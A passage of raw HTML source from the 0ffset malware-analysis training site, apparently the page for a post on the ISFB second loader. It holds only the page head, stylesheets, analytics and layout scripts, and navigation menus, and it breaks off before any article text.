<link rel="https://api.w.org/" href="https://www.0ffset.net/wp-json/" /><link rel="alternate" type="application/json" href="https://www.0ffset.net/wp-json/wp/v2/posts/2117" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.0ffset.net/xmlrpc.php?rsd" />
<link rel='shortlink' href='https://www.0ffset.net/?p=2117' />
<link rel="alternate" type="application/json+oembed" href="https://www.0ffset.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.0ffset.net%2Freverse-engineering%2Fanalyzing-isfb-second-loader%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://www.0ffset.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.0ffset.net%2Freverse-engineering%2Fanalyzing-isfb-second-loader%2F&#038;format=xml" />
<!-- HFCM by 99 Robots - Snippet # 2: Google Search Console -->
<meta name="google-site-verification" content="GiKrV-8gpS5ome6djZo40nVLsbGQoZAn1N6UYY2qwJ0" />
<!-- /end HFCM by 99 Robots -->
<!-- HFCM by 99 Robots - Snippet # 5: Google Analytics -->
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-YMWBZT97CQ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-YMWBZT97CQ');
</script>
<!-- /end HFCM by 99 Robots -->
<style type="text/css">
        /****Main Color****/

        	/*Background Color*/
            .bg-primary,
            .octf-btn,
            .octf-btn.octf-btn-second:hover, .octf-btn.octf-btn-second:focus,
            .main-navigation > ul > li:before,
            .cart-icon .count,
            .post-box .post-cat a,
            .post-box .btn-play:hover i,
            .page-pagination li span, .page-pagination li a:hover,
            .blog-post .share-post a,
            .post-nav a:before,
            .widget-area .widget .widget-title:before,
            .search-form .search-submit,
            .icon-box-s2.s2:after,
            .tech-box:hover,
            .ot-image-box:after,
            .service-box .icon-main,
            .serv-box-2:hover .icon-main,
            .project-slider .projects-box:hover .portfolio-info .btn-link,
            .project-slider .slick-arrow:hover,
            .ot-counter h6:before,
            .ot-progress .progress-bar,
            .video-popup a:hover,
            .ot-tabs .tab-link,
            .ot-tabs .tab-link.current, .ot-tabs .tab-link:hover,
            .ot-industries .indus-item .item-inner .overlay:after,
            .mc4wp-form-fields .subscribe-inner-form .subscribe-btn-icon{background:#0f4e73;}

            /*Border Color*/
            .post-box .btn-play:hover:before, .post-box .btn-play:hover:after,
            .page-pagination li span, .page-pagination li a:hover,
            .tech-box:hover,
            .video-popup a:hover span{border-color:#0f4e73;}

            /*Color*/
            .text-primary,
            .slick-arrow:not(.slick-disabled):hover,
            .btn-details,
            .btn-details:visited,
            a:hover, a:focus, a:active,
            .header-topbar a:hover,
            .extra-text a,
            .header-style-3 .header-topbar a:hover,
            .main-navigation ul > li > a:hover,
            .main-navigation ul li li a:before,
            .main-navigation ul li li a:hover,.main-navigation ul ul li.current-menu-item > a,.main-navigation ul ul li.current-menu-ancestor > a,
            .main-navigation ul > li.menu-item-has-children > a:hover:after,
            .octf-btn-cta .contact-header i,
            .header-style-3 .main-navigation ul.menu > li > a:hover,.header-style-3 .octf-btn-cta .octf-cta-icons i:hover,
            .header_mobile .mobile_nav .mobile_mainmenu li li a:hover,.header_mobile .mobile_nav .mobile_mainmenu ul > li > ul > li.current-menu-ancestor > a,
            .header_mobile .mobile_nav .mobile_mainmenu > li > a:hover, .header_mobile .mobile_nav .mobile_mainmenu > li.current-menu-item > a,.header_mobile .mobile_nav .mobile_mainmenu > li.current-menu-ancestor > a,
            .page-header,
            .page-header .breadcrumbs li:before,
            .post-box .entry-meta a:hover,
            .post-box .link-box a:hover,
            .post-box .btn-play i,
            .post-box .btn-readmore > a,
            .blog-post .author-bio .author-info .author-socials a:hover,
            .drop-cap span,
            .comments-area .comment-item .comment-meta .comment-reply-link,
            .comment-respond .comment-reply-title small a:hover,
            .icon-box-s2 .content-box h5 a:hover,
            .project-slider .projects-box .portfolio-info .btn-link i,
            .contact-info i,
            .ot-accordions .acc-item .acc-toggle:hover,
            .ot-accordions .acc-item.current .acc-toggle,
            .ot-accordions .acc-item.current .acc-toggle i,
            .ot-counter h6,
            .ot-counter2 .s-num,
            .team-wrap .team-social a:hover,
            .ot-pricing-table .inner-table h2,
            .ot-pricing-table .inner-table .details ul li.active:before,
            .ot-countdown li.seperator,
            .video-popup a,
            .dc-text .elementor-drop-cap span,
            .footer-menu ul li a:hover,
            .mc4wp-form-fields .subscribe-inner-form .subscribe-btn-icon:hover,
            #back-to-top{color: #0f4e73;}

            .wpcf7 .main-form{background-image: linear-gradient(90deg,#0f4e73 0%,#7141b1 100%);}
			

		/****Second Color****/
        
		    /*Background Color*/
                  .bg-second,
                  .octf-btn:hover, .octf-btn:focus,
                  .octf-btn.octf-btn-second,
                  .octf-btn.octf-btn-second:visited,
                  .post-box .post-cat a:hover,
                  .blog-post .tagcloud a:hover,
                  .widget .tagcloud a:hover,
                  .search-form .search-submit:hover,
                  .icon-box-s1 .line-box:after,
                  .project_filters li a:after,
                  .ot-tabs .tab-link:hover, .ot-tabs .tab-link:focus,
                  .wpcf7 .main-form button:hover{background:#7141b1;}

                  /*Color*/
                  blockquote:before,
                  .text-second,
                  .slick-dots li.slick-active button:before,
                  a,
                  a:visited,
                  .post-box .entry-meta,
                  .post-box .entry-meta a,
                  .post-box .link-box i,
                  .post-box .quote-box i,
                  .comment-form .logged-in-as a:hover,
                  .widget-area .widget ul:not(.recent-news) > li a:hover,
                  .widget-area .widget_categories ul li a:before,.widget-area .widget_product_categories ul li a:before,.widget-area .widget_archive ul li a:before,
                  .widget-area .widget_categories ul li a:hover,.widget-area .widget_product_categories ul li a:hover,.widget-area .widget_archive ul li a:hover,
                  .widget-area .widget_categories ul li a:hover + span,.widget-area .widget_product_categories ul li a:hover + span,.widget-area .widget_archive ul li a:hover + span,
                  .widget .recent-news h6 a:hover,
                  .ot-heading > span,
                  .icon-box-s1 .icon-main,
                  .icon-box-s2.s1 .icon-main, .icon-box-s2.s3 .icon-main,
                  .icon-box-s2.s2 .icon-main,
                  .serv-box .content-box ul li a:before,
                  .serv-box .content-box ul li:hover a, .serv-box .content-box ul li.active a,
                  .project_filters li a:hover, .project_filters li a.selected,
                  .ot-pricing-table .octf-btn:hover,
                  .dc-text.dc-text-second .elementor-drop-cap span{color: #7141b1;}

			</style><style type="text/css">	
            /**Main**/
                .woocommerce ul.products li.product .price .woocommerce-Price-amount, .woocommerce-page ul.products li.product .price .woocommerce-Price-amount,
                .woocommerce .woocommerce-Price-amount,
				.woocommerce div.product p.price,
				.woocommerce div.product span.price{
				  color: #0f4e73;
				}

				.woocommerce ul.products li.product .added_to_cart, .woocommerce-page ul.products li.product .added_to_cart,
				.woocommerce-mini-cart__buttons a.button.wc-forward,
				.woocommerce .widget_price_filter .price_slider_amount button.button,
				.woocommerce #respond input#submit.alt:hover, .woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover, .woocommerce input.button.alt:hover,.woocommerce #respond input#submit:hover, .woocommerce a.button:hover,.woocommerce input.button:hover, .woocommerce button.button.alt.disabled:hover,
				.woocommerce button.button,
				.woocommerce div.product .woocommerce-tabs ul.tabs li a:hover,
				.woocommerce div.product .woocommerce-tabs ul.tabs li.active a{
					background-color: #0f4e73;
				}

			/**Second**/

                .woocommerce table.shop_table td.product-name a:hover,
				.woocommerce-message:before,
				.woocommerce-info:before,
				.woocommerce ul.product_list_widget li a:not(.remove):hover,
				.woocommerce .woocommerce-widget-layered-nav-list li a:hover{
					color: #7141b1;
				}
				.woocommerce-mini-cart__buttons a.button.checkout{
					border-color: #7141b1;
				}
				.woocommerce-message,
				.woocommerce-info{
				  	border-top-color: #7141b1;
				}
				.woocommerce ul.products li.product .added_to_cart:hover, .woocommerce-page ul.products li.product .added_to_cart:hover,
				.woocommerce-mini-cart__buttons a.button.wc-forward:hover,
				.woocommerce-mini-cart__buttons a.button.checkout:hover,
				.woocommerce .widget_price_filter .ui-slider .ui-slider-range, .woocommerce .widget_price_filter .ui-slider .ui-slider-handle,
				.woocommerce #respond input#submit.alt, .woocommerce a.button.alt,.woocommerce button.button.alt, .woocommerce input.button.alt,.woocommerce #respond input#submit, .woocommerce a.button,.woocommerce input.button, .woocommerce button.button.alt.disabled,
				.woocommerce button.button:hover {
					background-color: #7141b1;
				}

			</style>	<noscript><style>.woocommerce-product-gallery{ opacity: 1 !important; }</style></noscript>
	<meta name="generator" content="Elementor 3.18.3; features: e_dom_optimization, e_optimized_assets_loading, additional_custom_breakpoints, block_editor_assets_optimize, e_image_loading_optimization; settings: css_print_method-external, google_font-enabled, font_display-auto">
<style class="wpcode-css-snippet">.page-id-2616 .primary-sidebar { display: none; }</style><meta name="generator" content="Powered by Slider Revolution 6.6.7 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
<link rel="icon" href="https://www.0ffset.net/wp-content/uploads/2021/05/cropped-z2a_logo-150x150.png" sizes="32x32" />
<link rel="icon" href="https://www.0ffset.net/wp-content/uploads/2021/05/cropped-z2a_logo-300x300.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://www.0ffset.net/wp-content/uploads/2021/05/cropped-z2a_logo-300x300.png" />
<meta name="msapplication-TileImage" content="https://www.0ffset.net/wp-content/uploads/2021/05/cropped-z2a_logo-300x300.png" />
<script>function setREVStartSize(e){
			//window.requestAnimationFrame(function() {
				window.RSIW = window.RSIW===undefined ? window.innerWidth : window.RSIW;
				window.RSIH = window.RSIH===undefined ? window.innerHeight : window.RSIH;
				try {
					var pw = document.getElementById(e.c).parentNode.offsetWidth,
						newh;
					pw = pw===0 || isNaN(pw) || (e.l=="fullwidth" || e.layout=="fullwidth") ? window.RSIW : pw;
					e.tabw = e.tabw===undefined ? 0 : parseInt(e.tabw);
					e.thumbw = e.thumbw===undefined ? 0 : parseInt(e.thumbw);
					e.tabh = e.tabh===undefined ? 0 : parseInt(e.tabh);
					e.thumbh = e.thumbh===undefined ? 0 : parseInt(e.thumbh);
					e.tabhide = e.tabhide===undefined ? 0 : parseInt(e.tabhide);
					e.thumbhide = e.thumbhide===undefined ? 0 : parseInt(e.thumbhide);
					e.mh = e.mh===undefined || e.mh=="" || e.mh==="auto" ? 0 : parseInt(e.mh,0);
					if(e.layout==="fullscreen" || e.l==="fullscreen")
						newh = Math.max(e.mh,window.RSIH);
					else{
						e.gw = Array.isArray(e.gw) ? e.gw : [e.gw];
						for (var i in e.rl) if (e.gw[i]===undefined || e.gw[i]===0) e.gw[i] = e.gw[i-1];
						e.gh = e.el===undefined || e.el==="" || (Array.isArray(e.el) && e.el.length==0)? e.gh : e.el;
						e.gh = Array.isArray(e.gh) ? e.gh : [e.gh];
						for (var i in e.rl) if (e.gh[i]===undefined || e.gh[i]===0) e.gh[i] = e.gh[i-1];
											
						var nl = new Array(e.rl.length),
							ix = 0,
							sl;
						e.tabw = e.tabhide>=pw ? 0 : e.tabw;
						e.thumbw = e.thumbhide>=pw ? 0 : e.thumbw;
						e.tabh = e.tabhide>=pw ? 0 : e.tabh;
						e.thumbh = e.thumbhide>=pw ? 0 : e.thumbh;
						for (var i in e.rl) nl[i] = e.rl[i]<window.RSIW ? 0 : e.rl[i];
						sl = nl[0];
						for (var i in nl) if (sl>nl[i] && nl[i]>0) { sl = nl[i]; ix=i;}
						var m = pw>(e.gw[ix]+e.tabw+e.thumbw) ? 1 : (pw-(e.tabw+e.thumbw)) / (e.gw[ix]);
						newh =  (e.gh[ix] * m) + (e.tabh + e.thumbh);
					}
					var el = document.getElementById(e.c);
					if (el!==null && el) el.style.height = newh+"px";
					el = document.getElementById(e.c+"_wrapper");
					if (el!==null && el) {
						el.style.height = newh+"px";
						el.style.display = "block";
					}
				} catch(e){
					console.log("Failure at Presize of Slider:" + e)
				}
			//});
		  };</script>
		<style type="text/css" id="wp-custom-css">
			.header-clone{
	height: 100px!important;
}
.elementor-widget-wrap>.elementor-element.btn-inline{
	display: inline-block;
	width: auto;
}
.elementor-3872 .elementor-element.elementor-element-4cff60df .elementor-icon-list-item span, .elementor-3872 .elementor-element.elementor-element-5e3bed1f .elementor-icon-list-item span {
    line-height: 16px;
}

.page-id-3872 #back-to-top{
	color: #656AE5;
}
.page-id-4858 #back-to-top{
	color: #53E79C;
}
.page-id-4899 #back-to-top{
	color: #35d3c9;
}


.post-box .entry-media img{
	max-width: 100%;
	object-fit: cover;
	height: 245px;
}



.post-box .entry-media .post-cat {
	left: 10px;
}

@media only screen and (max-width: 768px) {
	.post-cat a{
    margin-bottom: 10px;
  }
}

.post-box {
	margin-bottom: 30px;
}

.entry-content {
	padding: 90px 0 110px;
}


.blog-post .wp-post-image {
display: none;
}

.cartflows_step-template-default .primary-sidebar {
   display: none;
}		</style>
		<style id="kirki-inline-styles">.page-header{background-image:url("https://www.0ffset.net/wp-content/uploads/2022/09/emile-perron-xrVDYZRGdw4-unsplash.png");}#royal_preloader.royal_preloader_logo .royal_preloader_percentage{font-family:Roboto;font-size:13px;font-weight:400;letter-spacing:2px;line-height:40px;text-align:center;text-transform:none;}@media (max-width: 767px){}@media (min-width: 768px) and (max-width: 1024px){}@media (min-width: 1024px){}/* cyrillic-ext */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu72xMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
}
/* cyrillic */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu5mxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}
/* greek-ext */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu7mxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+1F00-1FFF;
}
/* greek */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu4WxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0370-03FF;
}
/* vietnamese */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu7WxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
}
/* latin-ext */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu7GxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu4mxMKTU1Kg.woff) format('woff');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}/* cyrillic-ext */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu72xMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
}
/* cyrillic */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu5mxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}
/* greek-ext */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu7mxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+1F00-1FFF;
}
/* greek */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu4WxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0370-03FF;
}
/* vietnamese */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu7WxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
}
/* latin-ext */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu7GxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu4mxMKTU1Kg.woff) format('woff');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}/* cyrillic-ext */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu72xMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
}
/* cyrillic */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu5mxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
}
/* greek-ext */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu7mxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+1F00-1FFF;
}
/* greek */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu4WxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0370-03FF;
}
/* vietnamese */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu7WxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
}
/* latin-ext */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu7GxMKTU1Kvnz.woff) format('woff');
  unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url(https://www.0ffset.net/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu4mxMKTU1Kg.woff) format('woff');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}</style></head>

<body class="post-template-default single single-post postid-2117 single-format-standard theme-engitech woocommerce-no-js royal_preloader woocommerce-active elementor-default elementor-kit-12 engitech-theme-ver-1.8.1 wordpress-version-6.4.2">
<div id="royal_preloader" data-width="346" data-height="153" data-url="https://www.0ffset.net/wp-content/uploads/2022/07/0ffset-rounded-01.png" data-color="#0a0f2b" data-bgcolor="#fff"></div><div id="page" class="site">
	<!-- #site-header-open -->
<header id="site-header" class="site-header header-static">

    <!-- #header-desktop-open -->
    <div class="header-desktop">		<div data-elementor-type="wp-post" data-elementor-id="2840" class="elementor elementor-2840" data-elementor-post-type="ot_header_builders">
									<section class="elementor-section elementor-top-section elementor-element elementor-element-65c14b10 elementor-section-content-middle ot-traditional elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="65c14b10" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-extended">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-581decff ot-flex-column-vertical" data-id="581decff" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-6c62b145 elementor-shape-square elementor-grid-4 e-grid-align-left elementor-widget elementor-widget-social-icons" data-id="6c62b145" data-element_type="widget" data-widget_type="social-icons.default">
				<div class="elementor-widget-container">
					<div class="elementor-social-icons-wrapper elementor-grid">
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-twitter elementor-repeater-item-4bf2890" href="https://twitter.com/0verfl0w_" target="_blank">
						<span class="elementor-screen-only">Twitter</span>
						<i class="fab fa-twitter"></i>					</a>
				</span>
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-linkedin elementor-repeater-item-a79d483" href="https://www.linkedin.com/company/0ffset/" target="_blank">
						<span class="elementor-screen-only">Linkedin</span>
						<i class="fab fa-linkedin"></i>					</a>
				</span>
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-youtube elementor-repeater-item-e6c93ca" href="https://www.youtube.com/channel/UCy21puSd9R3C5Xn46YI32_g" target="_blank">
						<span class="elementor-screen-only">Youtube</span>
						<i class="fab fa-youtube"></i>					</a>
				</span>
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-mastodon elementor-repeater-item-fc77638" href="https://infosec.exchange/@0verfl0w_" target="_blank">
						<span class="elementor-screen-only">Mastodon</span>
						<i class="fab fa-mastodon"></i>					</a>
				</span>
					</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-1ca041d7 ot-column-items-center ot-flex-column-vertical" data-id="1ca041d7" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-28dcb03 elementor-icon-list--layout-inline elementor-align-right elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="28dcb03" data-element_type="widget" data-widget_type="icon-list.default">
				<div class="elementor-widget-container">
					<ul class="elementor-icon-list-items elementor-inline-items">
							<li class="elementor-icon-list-item elementor-inline-item">
										<span class="elementor-icon-list-text"></span>
									</li>
								<li class="elementor-icon-list-item elementor-inline-item">
											<span class="elementor-icon-list-icon">
							<i aria-hidden="true" class="fas fa-map-pin"></i>						</span>
										<span class="elementor-icon-list-text">5 The Quadrant, Coventry</span>
									</li>
								<li class="elementor-icon-list-item elementor-inline-item">
											<a href="mailto:daniel@0ffset.net">

												<span class="elementor-icon-list-icon">
							<i aria-hidden="true" class="fas fa-envelope"></i>						</span>
										<span class="elementor-icon-list-text">contact@0ffset.net</span>
											</a>
									</li>
						</ul>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-4994a43 is-fixed ot-traditional elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="4994a43" data-element_type="section">
						<div class="elementor-container elementor-column-gap-extended">
					<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-2a40db59 ot-column-items-center ot-flex-column-vertical" data-id="2a40db59" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-7b08551e elementor-widget elementor-widget-ilogo" data-id="7b08551e" data-element_type="widget" data-widget_type="ilogo.default">
				<div class="elementor-widget-container">
						
	    	<div class="the-logo">
				<a href="https://www.0ffset.net/">
					<img src="https://www.0ffset.net/wp-content/uploads/2022/11/0ffset-rounded-01-1-1.png" alt="0ffset Training Solutions">
				</a>			        
		    </div>
		    
	    		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-57f4f99d ot-flex-column-vertical" data-id="57f4f99d" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-1ab58a34 elementor-widget elementor-widget-imenu" data-id="1ab58a34" data-element_type="widget" data-widget_type="imenu.default">
				<div class="elementor-widget-container">
						<nav id="site-navigation" class="main-navigation ">			
				<ul id="primary-menu" class="menu"><li id="menu-item-2315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-2315"><a href="https://www.0ffset.net/">Home</a></li>
<li id="menu-item-6372" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-6372"><a href="https://www.0ffset.net/blog/">Blog</a></li>
<li id="menu-item-6821" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-6821"><a href="https://www.0ffset.net/training/">Training</a>
<ul class="sub-menu">
	<li id="menu-item-7799" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7799"><a href="https://www.0ffset.net/training/zero2auto/">Zero2Automated</a></li>
	<li id="menu-item-7800" class="menu-item menu-item-type-post_type menu-item-object-e-landing-page menu-item-7800"><a href="https://www.0ffset.net/beginner/">The Beginner Course</a></li>
</ul>
</li>
<li id="menu-item-2015" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2015"><a href="https://www.0ffset.net/about-us/">Company</a></li>
<li id="menu-item-6374" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6374"><a href="https://www.0ffset.net/contact-us/">Contact Us</a></li>
</ul>			</nav>
	    		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-336223fd ot-flex-column-horizontal" data-id="336223fd" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-4c593 elementor-widget elementor-widget-isearch" data-id="4c593" data-element_type="widget" data-widget_type="isearch.default">
				<div class="elementor-widget-container">
						
	    	<div class="octf-search octf-btn-cta">
				<div class="toggle-search octf-cta-icons">
					<i class="flaticon-search"></i>
				</div>
				<!-- Form Search on Header -->
				<div class="h-search-form-field">
					<div class="h-search-form-inner">
						<form role="search" method="get" class="search-form" action="https://www.0ffset.net/" >
    <label><span class="screen-reader-text">Search for:</span>
    <input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" /></label>
	<button type="submit" class="search-submit"><i class="flaticon-search"></i></button>
    </form>					</div>									
				</div>
			</div>
		    
	    		</div>
				</div>
					</div>
		</div>
							</div>
		</section>
							</div>
		</div>    <!-- #header-desktop-close -->

    <!-- #header-mobile-open -->
    <div class="header_mobile">
	<div class="container">
		<div class="mlogo_wrapper clearfix">
	        <div class="mobile_logo">
				<a href="https://www.0ffset.net/">
					<img src="https://www.0ffset.net/wp-content/themes/engitech/images/logo.svg" alt="0ffset Training Solutions">
				</a>
	    	</div>
	        <div id="mmenu_toggle">
		        <button></button>
		    </div>
		    	    </div>
	    <div class="mmenu_wrapper">		
			<div class="mobile_nav collapse">
				<div class="mobile_mainmenu"><ul>
<li class="page_item page-item-23"><a href="https://www.0ffset.net/about/">About</a></li>
<li class="page_item page-item-1579"><a href="https://www.0ffset.net/about-us/">About Us</a></li>
<li class="page_item page-item-5 current_page_parent"><a href="https://www.0ffset.net/blog/">Blog</a></li>
<li class="page_item page-item-2615"><a href="https://www.0ffset.net/cart/">Cart</a></li>
<li class="page_item page-item-2616"><a href="https://www.0ffset.net/checkout/">Checkout</a></li>
<li class="page_item page-item-1476"><a href="https://www.0ffset.net/coming-soon-2/">Coming Soon</a></li>
<li class="page_item page-item-1370"><a href="https://www.0ffset.net/contact-us/">Contact Us</a></li>
